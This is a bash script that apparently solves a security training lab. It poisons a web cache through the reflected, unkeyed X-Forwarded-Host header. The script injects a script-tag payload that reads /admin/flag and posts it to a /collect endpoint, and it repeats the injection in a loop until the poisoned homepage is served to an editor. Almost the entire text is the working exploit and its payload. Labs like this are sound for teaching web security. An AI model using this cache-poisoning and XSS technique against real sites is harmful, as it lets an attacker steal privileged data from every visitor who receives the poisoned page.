#!/usr/bin/env bash
# Lab 33 — X-Forwarded-Host is reflected into the page and ignored by the key,
# so one request rewrites the homepage everyone else receives.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9330}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab33
ID="drop$$"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

PAYLOAD="x\"><script>fetch('/admin/flag').then(r=>r.text()).then(t=>fetch('/collect?id=$ID&c='+encodeURIComponent(t)))</script><x y=\""

# A hit never reaches the origin, so a payload can only land while the entry is
# expired. Keep repopulating it and let the editor's next reload find ours.
for _ in $(seq 1 40); do
    "$H5I" websec replay req_0 --session "$SESSION" --reset-budget --repeat 5 \
        --set path=/ --set "header.X-Forwarded-Host=$PAYLOAD" >/dev/null 2>&1
    OUT="$(send "$SESSION" req_0 --create --reset-budget \
        --set path=/collected --set "query.id=$ID" | body |
        python3 -c 'import json,sys,urllib.parse
print(" ".join(urllib.parse.unquote(r) for r in json.load(sys.stdin)["rows"]))')"
    [ -n "$OUT" ] && { printf '%s\n' "$OUT" | flag; exit 0; }
    sleep 0.6
done
echo "no flag found"
